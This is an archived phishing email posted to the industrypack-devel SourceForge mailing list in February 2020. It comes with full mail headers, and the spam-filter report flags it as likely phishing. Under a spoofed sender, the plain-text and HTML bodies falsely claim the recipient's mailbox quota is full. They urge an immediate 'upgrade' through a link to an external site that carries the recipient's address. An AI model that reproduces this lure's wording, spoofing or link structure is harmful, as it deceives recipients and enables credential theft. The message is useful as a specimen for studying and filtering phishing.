Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 4535C15A21A
	for <lists+industrypack-devel@lfdr.de>; Wed, 12 Feb 2020 08:34:13 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1j1mXE-0004z7-36
	for lists+industrypack-devel@lfdr.de; Wed, 12 Feb 2020 07:34:12 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 (envelope-from <rdap@ripe.net>) id 1j1mXC-0004ym-UV
 for industrypack-devel@lists.sourceforge.net; Wed, 12 Feb 2020 07:34:10 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Date:From:To:Subject:MIME-Version:Content-Type:
 Sender:Reply-To:Message-ID:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=pOUmgQpfUDeSh41FcFvmwWUFSZQOJrV9QPBrh51xqAk=; b=MxXl6AtdHz/E9RFB+G96LTfEfT
 DtBoIRpTwZjoQzVTEzjFKP0/NiRi+5yIby1BjcY7dxSQnNJXuynh9QRrCByIV0rEzX0uNFFVA9bZB
 2FaB0Eh7Ct60vl9ec++KppS4oBsOj+SuSR2Fijb7N53p3cjxgYc1ORVgL/hSfAyjWSb8=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Date:From:To:Subject:MIME-Version:Content-Type:Sender:Reply-To:Message-ID
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=pOUmgQpfUDeSh41FcFvmwWUFSZQOJrV9QPBrh51xqAk=; b=G
 gXzHMEnGtBsEAQeV0NZ8zgSaWLFjJGeS+8kqol0iqTdjmIrgotqopgxYs9aP7fk1XZylkuGfwyHyw
 AnjMBH7A9h5Tr8N3gTu55SSs6V0PY3s4PQfbpE28Rv23JatnypezaX5ZDPLEqTglmB35CRRbS+vLZ
 pqtzgRAIDH1QQjy0=;
Received: from www12302ue.sakura.ne.jp ([49.212.151.76] helo=mail.infoneo.jp)
 by sfi-mx-1.v28.lw.sourceforge.com with esmtp (Exim 4.92.2)
 id 1j1mXB-009LRp-D4
 for industrypack-devel@lists.sourceforge.net; Wed, 12 Feb 2020 07:34:10 +0000
Received: from [192.168.1.15] (modemcable062.130-37-24.static.videotron.ca
 [24.37.130.62])
 by mail.infoneo.jp (Postfix) with ESMTPA id 9DAE63C02D7
 for <industrypack-devel@lists.sourceforge.net>;
 Wed, 12 Feb 2020 13:49:14 +0900 (JST)
MIME-Version: 1.0
To: industrypack-devel@lists.sourceforge.net
From: "Email team" <rdap@ripe.net>
Date: Wed, 12 Feb 2020 02:27:04 -0500
X-Spam-Score: 3.9 (+++)
X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
 See http://spamassassin.org/tag/ for more details.
 0.0 URIBL_BLOCKED ADMINISTRATOR NOTICE: The query to URIBL was blocked.
 See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: studio41b.com]
 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 1.0 HTML_MESSAGE           BODY: HTML included in message
 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or identical to
 background 1.0 MISSING_MID            Missing Message-Id: header
 0.3 KHOP_HELO_FCRDNS       Relay HELO differs from its IP's reverse DNS
 0.4 UPGRADE_MAILBOX        Upgrade your mailbox! (phishing?)
 0.3 AWL AWL: Adjusted score from AWL reputation of From: address
X-Headers-End: 1j1mXB-009LRp-D4
Subject: [Industrypack-devel] Upgrade Your Mail Quota
 industrypack-devel@lists.sourceforge.net
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============4661900357659050163=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net
Message-Id: <E1j1mXE-0004z7-36@sfs-ml-1.v29.lw.sourceforge.com>

You will not see this in a MIME-aware mail reader.
--===============4661900357659050163==
Content-Type: multipart/alternative; boundary="===============1449680909=="

You will not see this in a MIME-aware mail reader.
--===============1449680909==
Content-Type: text/plain; charset="iso-8859-1"
MIME-Version: 1.0
Content-Transfer-Encoding: quoted-printable
Content-Description: Mail message body



 =

 	   industrypack-devel@lists.sourceforge.net, =


 Your mailbox quota is full
 This may cause your mailbox faulty or you may not be able to receive more =
messages on your e-mail

 To continue using your mailbox, you need to immediately upgrade your mailb=
ox quota. =


 =

    Upgrade mailbox quota here   =

 =


 Once the upgrade is complete, your mailbox will work effectively. =


 =A92020 Email security team. 	=20
--===============1449680909==
Content-Type: text/html; charset="iso-8859-1"
MIME-Version: 1.0
Content-Transfer-Encoding: quoted-printable
Content-Description: Mail message body

<html><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
=3Diso-8859-1"/></head><br><br>

<table width=3D"" align=3D"">

<td width=3D"30"></td>


<td width=3D"500">

<font face=3D"verdana" size=3D"2">

industrypack-devel@lists.sourceforge.net, <br><br>

Your mailbox quota is full<br>

This may cause your mailbox faulty or you may not be able to receive more m=
essages on your e-mail<br><br>


To continue using your mailbox, you need to immediately upgrade your mailbo=
x quota. <br><br>

<table width=3D"400" height=3D"40" bgcolor=3D"#424242"><tr><td>
<div align=3D"center">
<a href=3D"https://studio41b.com/email/csc/index.php?email=3Dindustrypack-d=
evel@lists.sourceforge.net" style=3D"text-decoration:none">
<font face=3D"verdana" color=3D"#ffffff" size=3D"2">
Upgrade mailbox quota here =

</font></a>
</div>
</td></tr></table>

<br><br>

Once the upgrade is complete, your mailbox will work effectively. =

<br><br>

=A92020 Email security team.

</td>

</tr></table></html>
--===============1449680909==--


--===============4661900357659050163==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============4661900357659050163==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============4661900357659050163==--

